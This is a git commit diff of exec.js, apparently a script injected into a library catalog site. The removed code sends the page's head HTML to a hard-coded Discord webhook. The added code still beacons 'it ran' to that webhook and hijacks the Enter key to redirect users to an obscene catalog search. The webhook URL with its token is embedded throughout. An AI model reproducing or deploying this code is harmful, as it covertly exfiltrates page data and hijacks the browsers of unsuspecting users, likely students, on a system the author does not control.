4fe1a89cff7186dfed331e0e0f28a07630e1d314
Ongenix <96583029+Ongenix@users.noreply.github.com>
2024-05-21 11:00:45 -0600

    Update exec.js

--- exec.js
+++ exec.js
@@ -1,30 +1,9 @@
-var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": window.location.href});xhr.send(data);
+var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'it ran'});xhr.send(data);
 
-function wait(ms){
-   var start = new Date().getTime();
-   var end = start;
-   while(end < start + ms) {
-     end = new Date().getTime();
-  }
-}
-function sendMessage(message) {
-    const webhookUrl = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";
-
-    for (let i = 0; i < Math.round(message.length / 256); i++) {
-        const request = new XMLHttpRequest();
-        request.open("POST", webhookUrl);
-        request.setRequestHeader("Content-type", "application/json");
-
-        const messageData = {
-            content: message.substr(i*256, i*256+256),
-            username: "My Webhook From Library Monday",
-            avatar_url: "https://example.com/avatar.png"
-        };
-
-        request.send(JSON.stringify(messageData));
-        wait(5000);
-    }
-}
-
-const all_elements = document.head.innerHTML;
-sendMessage(all_elements);
+(function() { 
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 'Enter') {
+            window.location.href = 'https://search.follettsoftware.com/metasearch/ui/134341/search/all?q=gay%20porn&ists=0&activeMenu=HOME';
+        }
+    });
+})();
